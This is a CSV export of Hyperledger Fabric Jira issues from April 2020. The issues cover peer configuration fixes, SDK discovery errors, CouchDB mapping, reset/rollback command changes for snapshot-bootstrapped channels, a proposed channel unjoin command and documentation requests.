Peer start has redundant,FAB-17789,44917,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,,wuyingjun,wuyingjun,23/Apr/20 4:52 PM,25/Apr/20 12:53 AM,28/Oct/23 3:10 AM,25/Apr/20 12:53 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,,,denyeart,wuyingjun,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bab:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,wuyingjun,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"25/Apr/20 12:53 AM;denyeart;Closing due to no description.

You can re-open if you add description.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Checking returned error is  redundant  when getting peer host by splitting coreConfig peerAddress,FAB-17790,44918,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,wuyingjun,wuyingjun,wuyingjun,23/Apr/20 5:17 PM,25/Apr/20 12:55 AM,28/Oct/23 3:10 AM,25/Apr/20 12:55 AM,,,,,,,,,,,,,,fabric-peer,,,,,,,,,0,,,,,,"Checking returned error is redundant when getting peer host by splitting coreConfig peerAddress.

It will return when  encountering errors in the process of getting coreConfig if the hostAddress is not formatted.

 

Pull Request: [https://github.com/hyperledger/fabric/pull/1156] ",,wuyingjun,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Apr/20 5:21 PM;wuyingjun;error-check.png;https://jira.hyperledger.org/secure/attachment/18301/error-check.png","23/Apr/20 5:21 PM;wuyingjun;error-return.png;https://jira.hyperledger.org/secure/attachment/18302/error-return.png",,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzyzxo:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wuyingjun,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Error: No discovery targets found when replacing v1.4 sdk-node modules with v2.1 equivalents in fabric-chaincode-integration,FAB-17791,44920,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Won't Do,,heatherp,heatherp,23/Apr/20 9:43 PM,30/Apr/20 9:46 PM,28/Oct/23 3:10 AM,30/Apr/20 9:46 PM,v2.1.0,,,,,,,,,,,,,fabric-sdk-node,fabric-test,,,,,,,,0,,,,,,"The fabric-chaincode-integration tool is published in the fabric-test repository and it's purpose is to be ran against some chaincode, which is runs a set of cucumber tests against to verify it behaves as expected. It makes use of sdk-node modules to register users in the network, for example.
 I started down this rabbit by attempting to update these modules from previous versions to v2.1, in doing so changing some of the functionality that's been removed under v2.1

When replacing ([https://github.com/hyperledger/fabric-test/tree/master/tools/chaincode-integration/src/step-definitions/identity)] functionality with equivalent v2.1 functionality (as instructed by fabcar sample), I see:

_2020-04-23T12:06:35.653Z error [cc-integration:./src/step-definitions/hooks.ts No discovery targets found_ 
 _2020-04-23T12:06:35.653Z error [cc-integration:./src/step-definitions/hooks.ts Error: No discovery targets found_
 _at NetworkImpl._initializeInternalChannel (/Users/heatherp/fabric-contract-api-go/node_modules/fabric-network/lib/network.js:89:27)_

This is the line complaining: [https://github.com/hyperledger/fabric-sdk-node/blob/fe2d00bb78faa85c4ad012b144814c648a70537d/fabric-network/src/network.ts#L119]

So I think the problem starts with: [https://github.com/hyperledger/fabric-sdk-node/blob/fe2d00bb78faa85c4ad012b144814c648a70537d/fabric-network/src/network.ts#L108]
 I checked that the mpsid from gateway.getIdentity().mspid matches org.mspid. - see pushed branch below

 

Thoughts / Questions:
 - when ""single-org"" and ""three-org"" network tests run together, only ""single-org"" fails? but ""three-org"" fails when ran on it's own too..

 - often see Parsed peers for Orderer [], not sure Orderer [] is the correct organisation name?

Links:
 chaincode-integration: [https://github.com/hyperledger/fabric-test/tree/master/tools/chaincode-integration]

changes I couldn't make work to pushed branch: [https://github.com/heatherlp/fabric-test/commit/fff7089a1e32487c2601499298f7583f5d34fcee]",,heatherp,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01baj:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),heatherp,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Apr/20 11:32 PM;heatherp;Ok, I can't get around this. I've tried backing out the changes to revert to using older sdk-node modules and I just can't get it to work, I'm not sure how it worked in the first place. I've tried the following versions of node-sdk modules: 2.0.0-beta.2, 2.1.0, 2.0.0-beta.4 and 1.4.8. Each of them fail to build the project for various reasons, usually type issues. 

So I guess the best avenue is to fix why discovery is failing, as per the issue described above, rather than try to back out and use older versions. I think this blocks the fabric-contract-api-go v2.1.0 release? TBC;;;","30/Apr/20 9:46 PM;heatherp;I've fixed issues in the chaincode integration test tool in my latest PR in fabric-test, so closing this;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Documentation: reset/rollback command updates,FAB-17792,44923,45917,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wenjian,wenjian,wenjian,24/Apr/20 12:55 AM,09/Nov/20 1:17 PM,28/Oct/23 3:10 AM,09/Nov/20 1:17 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,,,manish-sethi,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01baz:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"09/Nov/20 1:17 PM;manish-sethi;https://github.com/hyperledger/fabric/pull/2053;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Generate db name mapping for CouchDB,FAB-17793,44924,44915,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,wenjian,wenjian,24/Apr/20 12:55 AM,20/May/20 10:58 PM,28/Oct/23 3:10 AM,20/May/20 10:58 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,,,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17901,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bb7:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wenjian,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"15/May/20 5:08 AM;wenjian;PR: [https://github.com/hyperledger/fabric/pull/1268];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Drop channel couchdbs based on the mapping from channel names to couchdb names,FAB-17794,44926,44915,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wenjian,wenjian,wenjian,24/Apr/20 12:57 AM,11/Jul/20 11:05 PM,28/Oct/23 3:10 AM,11/Jul/20 11:05 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,,,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bbn:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Jul/20 11:05 PM;wenjian;PR: [https://github.com/hyperledger/fabric/pull/1547];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"When moving from v2.0/2.1 to v2.2+, build mapping table retroactively at peer start",FAB-17795,44927,44915,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,wenjian,wenjian,24/Apr/20 12:59 AM,11/Jun/20 1:02 AM,28/Oct/23 3:10 AM,11/Jun/20 1:02 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,,,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bbv:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wenjian,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"04/Jun/20 10:30 PM;wenjian;PR: [https://github.com/hyperledger/fabric/pull/1369];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Automatically drop partially populated state couchdbs after peer bootstrap crash/failure,FAB-17796,44928,44915,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,wenjian,wenjian,24/Apr/20 1:00 AM,14/Aug/20 12:34 PM,28/Oct/23 3:10 AM,05/Aug/20 9:35 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,,,manish-sethi,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bc3:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"05/Aug/20 9:35 PM;manish-sethi;This is already handled in https://jira.hyperledger.org/browse/FAB-18097

(https://github.com/hyperledger/fabric/pull/1651/files#diff-4cbd873d78bc5fb0e4f03dec7bb84913R275);;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update peer reset/rollback commands to delete channel-specific data instead of entire databases,FAB-17797,44929,45756,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,wenjian,wenjian,24/Apr/20 1:04 AM,26/Oct/20 11:43 PM,28/Oct/23 3:10 AM,26/Oct/20 11:43 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"* The reset command is enhanced to reset a specific channel and will only delete channel-specific ledger data instead of dropping entire databases
 * The rollback command will only delete channel-specific ledger data instead of dropping entire databases",,manish-sethi,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17800,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bcb:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/Oct/20 11:43 PM;manish-sethi;See details in FAB-17800;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
(Duplicate) Update QSCC queries to accommodate peers bootstrapped from a snapshot,FAB-17798,44931,45756,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,wenjian,wenjian,24/Apr/20 4:58 AM,15/Aug/20 2:04 AM,28/Oct/23 3:10 AM,15/Aug/20 2:03 AM,,,,,,,,,,v2.x,,,,fabric-ledger,,,,,,,,,0,,,,,,"* Update GetChainInfo to return bootstrap snapshot metadata and latest snapshot metadata
 * QSCC queries return proper error message when the input block number and txid are below the bootstrap snapshot height",,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17691,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bcr:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Documentation: historydb may not have all entries on a peer bootstrapped with a snapshot,FAB-17799,44932,45917,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,denyeart,wenjian,wenjian,24/Apr/20 4:59 AM,16/Nov/20 12:56 PM,28/Oct/23 3:10 AM,16/Nov/20 12:56 PM,,,,,,,,,,v2.x,,,,fabric-ledger,,,,,,,,,0,,,,,,,,manish-sethi,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bcz:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Nov/20 12:56 PM;manish-sethi;https://github.com/hyperledger/fabric/pull/2099;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update reset/rollback commands to return error if any channel on the peer is bootstrapped with a snapshot,FAB-17800,44933,45756,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,wenjian,wenjian,24/Apr/20 5:01 AM,30/Oct/20 3:37 AM,28/Oct/23 3:10 AM,27/Oct/20 12:22 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"The reset/rollback commands only work if all the channels on the peer are bootstrapped from genesis blocks. If any channel on the peer is bootstrapped with a snapshot, the commands will return an error saying the command is not supported because at least one channel is bootstrapped with a snapshot.",,manish-sethi,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17797,FAB-17803,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bd7:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,wenjian,,,,,,,,,,,,,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"08/Oct/20 11:46 PM;wenjian;PR: https://github.com/hyperledger/fabric/pull/1990;;;","26/Oct/20 12:28 PM;manish-sethi;Adding more details on the decision:

In the current implementation, the command {{reset}} drops the derived databases (such as statedb, historydb, and blockindex) and truncates the blockfiles for all the channels to the genesis block level. This leaves the peer largely in a state as if the peer has just joined the channels using the genesis blocks, except some additional maintenance of maximum visited height for each channel to defer endorsements until the peer reaches the previous height. However, with the introduction of joining a channel using a snapshot instead of a genesis block, we cannot allow for dropping the databases. This is because, these databases cannot be rebuilt in the absence of missing data that was supplied by the snapshot. This leaves us with the following two options if we want to continue to support the reset command

1)  Keep the snapshot package even after channel has been constructed only for the purpose of supporting the {{reset}} command. However, this approach requires additional storage just for supporting the {{reset}}, which is not a strategic operation as such. Instead a new peer can always be built

2) Make the {{reset}} a channel specific command and allow only for the channels that has been bootstrapped from the genesis block. However, this introduces non-uniformity in operations management across channels - based on how the channel has been created. In addition, this breaks the backward compatibility, as this would require the couchdb to be up while peer to be down, so that we can delete the channel specific data from couchdb.

Considering the above, it is better to keep supporting the {{reset}} command in the current form for backward compatibility only (i.e., as long as peer does not use snapshots) but return error if any channel on the peer is bootstrapped from snapshot. Instead, we would later introduce another command {{unjoin channel}} that should work across channels in a uniform way and would perhaps be more useful in broader scenarios beyond allowing for fixing the bugs.

The above description largely applies to other similar commands i.e., {{rollback}} and {{rebuilddbs}}. We can give the same treatment to those commands as well. Having said that, rollback command may still offer some benefits if supported in a different form for limited number of previous blocks across channels types. One way of achieving this is by maintaining the undo logs for limited number of db batches. However, since with the combination of snaphots and unjoin command, it may always be possible to unjoin and join again by the recent snapshot. So, it's better to see if there would be a requirement for the rollback in the future.;;;","26/Oct/20 11:44 PM;manish-sethi;https://github.com/hyperledger/fabric/pull/2044;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement a new unjoin command to unjoin a peer from the channel,FAB-17801,44934,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,,wenjian,wenjian,24/Apr/20 5:03 AM,21/May/21 12:44 PM,28/Oct/23 3:10 AM,25/Nov/20 2:39 AM,,,,,,,,,,v2.x,,,,fabric-ledger,,,,,,,,,0,,,,,,"* Implement a new peer command (peer node unjoin) to unjoin the peer from the channel. The command takes a -channel parameter and will delete all the channel-specific data stored on the ledger. The channel-specific data includes blocks and data entries in stateleveldb, statecouchdb (drop databases), confighistorydb, bookkeepingdb, historydb, blockindex, ledger idStore.",,AshishkumarLakshmanan,wenjian,ymlbright,,,,,,,,,,,,,,,,,,,FAB-17787,,,,,,,,,,,,,,,,,,,,,FAB-11334,,,,FAB-106,FAB-16035,FAB-11334,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0iif",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),AshishkumarLakshmanan,wenjian,ymlbright,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Delete blocks and blockindexes for a specific channel,FAB-17802,44935,44915,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,wenjian,wenjian,24/Apr/20 5:10 AM,02/Jul/20 11:49 PM,28/Oct/23 3:10 AM,02/Jul/20 11:49 PM,,,,,,,,,,v2.x,,,,fabric-ledger,,,,,,,,,0,,,,,,,,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17992,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01bdn:",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
(Duplicate) Update reset/rollback commands to consider some channels may have been bootstrapped with snapshots,FAB-17803,44936,45756,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Duplicate,wenjian,wenjian,wenjian,24/Apr/20 5:11 AM,27/Oct/20 2:47 AM,28/Oct/23 3:10 AM,26/Oct/20 11:51 PM,,,,,,,,,,v2.x,,,,fabric-ledger,,,,,,,,,0,,,,,,"We do not require a peer to keep the bootstrap snapshot files. During reset/rollback, we cannot simply drop all leveldbs because the bootstrap snapshot may not be available for a channel. Therefore, the existing reset/rollback commands only work if all channels are bootstrapped with genesis blocks.

Acceptance criteria:
 * The reset/rollback commands should only work if all the channels on the peer are bootstrapped from genesis blocks. If any channel on the peer is bootstrapped with a snapshot, the commands will return an error saying the command is not supported because at least one channel is bootstrapped with a snapshot. We will add a ""unjoin"" command to unjoin a channel (FAB-17787).
 * Enhance reset command to take a channel parameter and it will delete channel-specific data from the ledger instead of dropping entire dbs.
 * Enhance rollback command to delete channel-specific data from the ledger instead of dropping entire dbs.

 ",,wenjian,,,,,,,,,,,,,,,,,,,,,FAB-17787,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17800,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Yes,Unset,,,,,No,,Unset,No,,,"1|i00wur:0iii",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"The variable peerAddress is misspelled as ""preeAddress"" when config is loading",FAB-17804,44937,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wuyingjun,wuyingjun,wuyingjun,24/Apr/20 11:41 AM,25/Apr/20 12:56 AM,28/Oct/23 3:10 AM,25/Apr/20 12:56 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"The variable peerAddress is misspelled as ""preeAddress"" when config is loading.

Pull request Address : [https://github.com/hyperledger/fabric/pull/1161]",,wuyingjun,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Apr/20 11:43 AM;wuyingjun;error.png;https://jira.hyperledger.org/secure/attachment/18308/error.png",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01be3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wuyingjun,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Duplicate code in file bccsp/sw/ecdsa_test.go,FAB-17805,44940,,Bug,Closed,FAB,Fabric,software,denyeart,,,Low,Done,xwu,xwu,xwu,24/Apr/20 8:03 PM,25/Apr/20 12:58 AM,28/Oct/23 3:10 AM,25/Apr/20 12:58 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"In function TestSignECDSABadParameter, ""lowLevelKey.Params().N = oldN"" (https://github.com/hyperledger/fabric/blob/9fabf569a7f4a0b161a6cbed19b1de6cc81db6af/bccsp/sw/ecdsa_test.go#L45) is meaningless, whose function has been implemented in defer(https://github.com/hyperledger/fabric/blob/9fabf569a7f4a0b161a6cbed19b1de6cc81db6af/bccsp/sw/ecdsa_test.go#L40).
In function TestVerifyECDSA, https://github.com/hyperledger/fabric/blob/9fabf569a7f4a0b161a6cbed19b1de6cc81db6af/bccsp/sw/ecdsa_test.go#L63~#L65 and https://github.com/hyperledger/fabric/blob/9fabf569a7f4a0b161a6cbed19b1de6cc81db6af/bccsp/sw/ecdsa_test.go#L67~#L69 are repeated.


",,xwu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01ber:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),xwu,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"24/Apr/20 8:39 PM;xwu;https://github.com/hyperledger/fabric/pull/1164;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fabric contract/ledger API documentation,FAB-17806,44941,,Documentation,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,denyeart,denyeart,24/Apr/20 9:27 PM,26/Feb/21 11:18 PM,28/Oct/23 3:10 AM,,,,,,,,,,,,,,,fabric-docs,fabric-samples,,,,,,,,1,,,,,,"We need an API cheat sheet in the main Fabric docs, which has pointers to the contract and ledger API reference doc and snippets for each of the three supported languages.

It is currently way too difficult to find the API reference docs, and once you get there, there are no snippets showing how the APIs work together, e.g. the sequence of APIs to call for the most trivial state-based endorsement scenario.",,btl5037,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwrhj:v",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"03/May/20 2:41 AM;btl5037;+1 on this;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Option to rollback private data store when rolling back peer to a prior height (for backup/restore scenarios),FAB-17807,44942,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,denyeart,denyeart,24/Apr/20 10:12 PM,05/Sep/20 6:54 AM,28/Oct/23 3:10 AM,05/Sep/20 4:22 AM,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,2,operator,,,,,"`peer node rollback` command currently preserves private data store, since the assumption is that private data is still valid and should be used as the peer re-processes blocks to catch up to latest height.

However, in the case of a network level backup/restore due to a disaster, the consortium may decide to restore to a prior orderer height. In these scenarios the peers would need to be rolled back to the same height, including the private data store.",,denyeart,jeremy-ls,robmurgai,rolivieri,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-18024,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0iqr",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,jeremy-ls,robmurgai,rolivieri,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"05/Sep/20 4:22 AM;denyeart;We decided not to pursue a backup scenario where peers are rolled back, closing.;;;","05/Sep/20 6:54 AM;jeremy-ls;[~denyeart] is there an alternative strategy for backup/restore that's available or in the works?;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
